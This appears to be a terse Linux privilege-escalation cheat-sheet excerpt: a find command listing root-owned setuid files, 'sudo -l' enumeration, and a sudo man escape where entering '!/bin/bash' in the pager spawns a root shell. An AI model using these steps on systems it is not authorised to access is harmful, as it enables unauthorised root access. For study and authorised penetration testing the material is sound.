Searches for files and directories owned by the `root` user that have the setuid bit set (-perm -4000), and then executes the `ls -ldb` command on each file or directory found, displaying detailed information about each one.

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

Example : the /etc/shadow file is writable

###### List the available sudo privileges for the current user.

```
sudo -l
```

Example : the current user can run sudo man without providing password

```
sudo man ls
```

add : !/bin/bash
